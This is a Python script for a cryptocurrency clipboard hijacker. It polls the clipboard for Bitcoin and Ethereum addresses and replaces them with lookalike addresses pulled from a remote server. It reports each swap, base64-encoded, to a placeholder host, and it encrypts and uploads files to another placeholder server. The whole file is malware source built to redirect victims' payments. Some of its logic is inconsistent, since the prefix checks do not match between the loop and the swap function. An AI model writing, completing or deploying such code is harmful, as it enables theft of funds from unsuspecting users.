import pyperclip
import random
import requests
import json
import base64
import os
import tempfile
from cryptography.fernet import Fernet

coin_types = ["btc", "eth"]

# Function to replace copied address with a random similar address
def replace_address():
    current_address = pyperclip.paste()
    for coin_type in coin_types:
        if current_address.startswith(f"{coin_type}:"):
            address_list = get_similar_addresses(coin_type)
            new_address = random.choice(address_list)
            new_address = f"{coin_type}:{new_address}"
            pyperclip.copy(new_address)
            print(f"Address replaced: {current_address} -> {new_address}")
            # Notify web application/log file here
            data = {
                "coin_type": coin_type,
                "original_address": current_address,
                "new_address": new_address
            }
            send_notification(data)

# Function to send notification to web application/log file
def send_notification(data):
    url = "http://your-web-application.com/notify"
    headers = {"Content-type": "application/json"}
    encoded_data = base64.b64encode(json.dumps(data).encode("utf-8"))
    payload = {"data": encoded_data}
    try:
        response = requests.post(url, headers=headers, json=payload)
        print(f"Notification sent: {response.status_code}")
    except Exception as e:
        print(f"Error sending notification: {e}")

# Function to encrypt the text file using the password in the config file
def encrypt_file(file_path, password):
    with open(file_path, "rb") as f:
        data = f.read()
    fernet = Fernet(password)
    encrypted_data = fernet.encrypt(data)
    with open(file_path, "wb") as f:
        f.write(encrypted_data)

# Function to upload the encrypted text file to the server
def upload_file(file_path, url):
    with open(file_path, "rb") as f:
        data = f.read()
    files = {"file": data}
    try:
        response = requests.post(url, files=files)
        print(f"File uploaded: {response.status_code}")
    except Exception as e:
        print(f"Error uploading file: {e}")

# Function to get list of similar addresses for a given coin type
def get_similar_addresses(coin_type):
    try:
        response = requests.get(f"http://your-web-application.com/similar_addresses/{coin_type}")
        addresses = json.loads(response.content.decode("utf-8"))
        return addresses
    except Exception as e:
        print(f"Error getting similar addresses: {e}")
        return []

# Call the replace_address() function whenever clipboard changes
while True:
    try:
        current_address = pyperclip.paste()
        if current_address.startswith("1") or current_address.startswith("3"):
            replace_address()
        elif current_address.startswith("bc1"):
            replace_address()
        elif current_address.startswith("0x"):
            replace_address()
        
        # Save list of similar addresses to temp directory for each coin type
        for coin_type in coin_types:
            addresses = get_similar_addresses(coin_type)
            with tempfile.TemporaryDirectory() as temp_dir:
                file_path = os.path.join(temp_dir, f"{coin_type}_similar_addresses.txt")
                with open(file_path, "w") as file:
                    file.write("\n".join(addresses))
                # Encrypt the text file with the password specified in the config file
                password = "your_password_here"
                encrypt_file(file_path, password)
                # Upload the encrypted text file to the server specified in the config file
                server_url = "http://your-server-url-here.com/upload"
                upload_file(file_path, server_url)
    except KeyboardInterrupt:
        break
